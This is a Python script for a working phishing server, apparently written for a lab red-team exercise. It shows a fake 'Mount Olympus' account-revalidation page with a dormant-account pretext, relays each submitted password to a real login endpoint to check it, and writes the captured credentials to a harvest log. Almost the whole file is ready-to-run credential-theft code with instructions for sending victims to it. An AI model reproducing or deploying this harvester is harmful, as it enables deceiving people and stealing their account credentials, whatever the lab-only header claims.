#!/usr/bin/env python3
# ============================================================================
#  Mount Olympus - account revalidation portal (AiTM credential harvester)
#  ISOLATED LAB ONLY. Authorised red-team assessment. Do not deploy anywhere real.
#
#  Pretext: "your account has been inactive for 6+ months, revalidate to restore
#  access". The design is intentionally DIFFERENT from the real Hades portal.
#
#  When a victim submits, the current credential is RELAYED to the REAL login to
#  validate it (the attacker cannot reach the DC, so the real portal is the
#  validation oracle):
#    - valid   -> log the credential and show "access restored"
#    - invalid -> re-show the form with an error, forcing a realistic retry
#
#  Run on the attacker box (Kali):  python3 phish_server.py
#  Then send victims to:            http://<kali-ip>:8080/
# ============================================================================
import http.server
import socketserver
import urllib.parse
import urllib.request
import datetime
import os

# ----- config -----
LISTEN_PORT  = 8080
REAL_LOGIN   = "http://10.1.1.10/cgi-bin/login.py"   # validation oracle (real handler)
REAL_PORTAL  = "http://10.1.1.10/login.html"         # link shown after a successful capture
HARVEST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "harvested.log")

_HEAD = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mount Olympus — Account Revalidation</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;900&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
  :root{
    --gold:#C9A227; --gold-bright:#E8CB5A; --gold-deep:#9A7A1C;
    --marble:#FBF8EF; --marble-line:#E4DBC2;
    --ink:#2B3A4A; --ink-soft:#5A6B7C; --ink-dim:#8A97A4;
    --accent:#3A6EA5; --sky-a:#8FC3E6; --sky-b:#BFE0F2; --sky-c:#EAF5FB;
  }
  *{box-sizing:border-box}
  body{
    margin:0; min-height:100vh; color:var(--ink);
    font-family:"IBM Plex Sans",system-ui,sans-serif;
    display:flex; align-items:center; justify-content:center; padding:1.5rem;
    overflow:hidden;
    background:
      radial-gradient(150px 70px at 12% 26%, rgba(255,255,255,.95), transparent 72%),
      radial-gradient(210px 90px at 83% 18%, rgba(255,255,255,.92), transparent 72%),
      radial-gradient(180px 80px at 72% 74%, rgba(255,255,255,.85), transparent 72%),
      radial-gradient(160px 72px at 22% 82%, rgba(255,255,255,.9), transparent 72%),
      radial-gradient(120px 56px at 48% 10%, rgba(255,255,255,.8), transparent 72%),
      linear-gradient(180deg, var(--sky-a) 0%, var(--sky-b) 48%, var(--sky-c) 100%);
  }
  .card{
    position:relative; z-index:1; width:100%; max-width:410px;
    background:linear-gradient(180deg, #ffffff, var(--marble));
    border:1px solid var(--marble-line); border-radius:16px; padding:2.4rem 2.2rem 2rem;
    box-shadow:0 30px 70px -28px rgba(43,58,74,.45), 0 2px 0 rgba(255,255,255,.8) inset;
  }
  .card::before{
    content:""; position:absolute; left:1.6rem; right:1.6rem; top:0; height:3px;
    background:linear-gradient(90deg, transparent, var(--gold), transparent); border-radius:3px;
  }
  .crest{
    width:62px; height:62px; margin:0 auto 1rem; border-radius:50%;
    display:flex; align-items:center; justify-content:center; font-size:32px; color:#fff;
    background:radial-gradient(circle at 50% 35%, var(--gold-bright), var(--gold-deep));
    box-shadow:0 10px 24px -8px rgba(154,122,28,.7), 0 0 0 5px rgba(201,162,39,.15);
  }
  h1{
    font-family:"Cinzel",serif; font-weight:900; font-size:1.45rem; letter-spacing:.04em;
    text-transform:uppercase; text-align:center; margin:0 0 .2rem; color:var(--ink);
  }
  .sub{
    text-align:center; font-family:"JetBrains Mono",monospace; font-size:.66rem;
    letter-spacing:.24em; text-transform:uppercase; color:var(--gold-deep); margin:0 0 1.5rem;
  }
  .notice{
    background:rgba(58,110,165,.08); border:1px solid rgba(58,110,165,.22);
    border-radius:10px; padding:.85rem 1rem; margin:0 0 1.5rem;
    font-size:.86rem; line-height:1.55; color:var(--ink-soft);
  }
  .notice b{color:var(--ink)}
  .err{
    background:rgba(197,58,58,.08); border:1px solid rgba(197,58,58,.3); color:#B23A3A;
    border-radius:8px; padding:.6rem .8rem; margin:0 0 1.1rem;
    font-family:"JetBrains Mono",monospace; font-size:.74rem; text-align:center;
  }
  label{
    display:block; font-family:"JetBrains Mono",monospace; font-size:.64rem;
    letter-spacing:.14em; text-transform:uppercase; color:var(--ink-dim); margin:0 0 .4rem;
  }
  input{
    width:100%; padding:.74rem .85rem; margin-bottom:1.15rem; background:#fff;
    border:1px solid var(--marble-line); border-radius:9px; color:var(--ink);
    font-family:"JetBrains Mono",monospace; font-size:.92rem; outline:none;
    transition:border-color .15s, box-shadow .15s;
  }
  input:focus{border-color:var(--gold); box-shadow:0 0 0 3px rgba(201,162,39,.16)}
  button{
    width:100%; padding:.85rem; border:none; border-radius:9px; cursor:pointer; margin-top:.2rem;
    background:linear-gradient(180deg, var(--gold-bright), var(--gold-deep)); color:#3a2c06;
    font-family:"Cinzel",serif; font-weight:700; letter-spacing:.1em; text-transform:uppercase; font-size:.85rem;
    box-shadow:0 12px 26px -12px rgba(154,122,28,.8); transition:filter .15s, transform .05s;
  }
  button:hover{filter:brightness(1.06)}
  button:active{transform:translateY(1px)}
  .foot{
    text-align:center; font-family:"JetBrains Mono",monospace; font-size:.6rem;
    letter-spacing:.12em; color:var(--ink-dim); margin-top:1.6rem;
  }
  .ok-wrap{text-align:center}
  .ok-wrap h1{margin-bottom:.6rem}
  .ok-wrap p{color:var(--ink-soft); font-size:.92rem; line-height:1.6}
  .ok-wrap a{
    display:inline-block; margin-top:1.3rem; padding:.7rem 1.4rem; border-radius:9px;
    background:linear-gradient(180deg, var(--gold-bright), var(--gold-deep)); color:#3a2c06;
    text-decoration:none; font-family:"Cinzel",serif; font-weight:700; letter-spacing:.08em;
    text-transform:uppercase; font-size:.8rem;
  }
</style>
</head>
<body>
  <main class="card">
"""

_FOOT = """
  </main>
</body>
</html>
"""

FORM = _HEAD + """    <div class="crest">&#9889;</div>
    <h1>Mount Olympus</h1>
    <p class="sub">Divine Access &middot; Revalidation</p>
    <div class="notice">
      Your account has not been accessed in over <b>6 months</b>. For the security
      of the halls of Olympus, dormant accounts must be revalidated. Confirm your
      identity below to restore your access.
    </div>
    <!--ERR-->
    <form action="/" method="POST" autocomplete="off">
      <label for="username">Keeper ID</label>
      <input type="text" id="username" name="username" required>
      <label for="password">Passphrase</label>
      <input type="password" id="password" name="password" required>
      <button type="submit">Revalidate Access</button>
    </form>
    <p class="foot">By decree of the Olympian Council</p>
""" + _FOOT

SUCCESS = _HEAD + """    <div class="ok-wrap">
      <div class="crest">&#9889;</div>
      <h1>Access Restored</h1>
      <p>Your identity has been revalidated. Welcome back to the halls of Olympus
      &mdash; your access has been reinstated.</p>
      <a href="%s">Continue to the portal</a>
    </div>
""" % REAL_PORTAL + _FOOT

ERR_HTML = '<div class="err">Credentials could not be validated. Please try again.</div>'


def validate(username, password):
    """Relay the credential to the REAL portal; True if it grants access."""
    data = urllib.parse.urlencode({"username": username, "password": password}).encode()
    try:
        resp = urllib.request.urlopen(REAL_LOGIN, data=data, timeout=10)
        body = resp.read().decode("utf-8", "replace")
        return "Access granted" in body
    except Exception:
        return False


def log_attempt(src, username, password, ok):
    stamp = datetime.datetime.now().isoformat(timespec="seconds")
    line = "%s\t%s\t%s\t%s\t%s\n" % (stamp, src, username, password, "VALID" if ok else "invalid")
    try:
        with open(HARVEST_FILE, "a", encoding="utf-8") as fh:
            fh.write(line)
    except OSError:
        pass
    print("%s  %s : %s  (from %s)" % ("[+] VALID" if ok else "[-] invalid", username, password, src))


class Handler(http.server.BaseHTTPRequestHandler):
    def _send(self, html, code=200):
        data = html.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        self._send(FORM.replace("<!--ERR-->", ""))

    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length).decode("utf-8", "replace")
        fields = urllib.parse.parse_qs(body)
        username = fields.get("username", [""])[0]
        password = fields.get("password", [""])[0]
        ok = validate(username, password)
        log_attempt(self.client_address[0], username, password, ok)
        if ok:
            self._send(SUCCESS)
        else:
            self._send(FORM.replace("<!--ERR-->", ERR_HTML))

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    print("[*] Mount Olympus revalidation portal")
    print("[*] Listening on http://0.0.0.0:%d/" % LISTEN_PORT)
    print("[*] Validating against : %s" % REAL_LOGIN)
    print("[*] Captured credentials : %s" % HARVEST_FILE)
    print("[*] Ctrl+C to stop.\n")
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", LISTEN_PORT), Handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Stopped.")
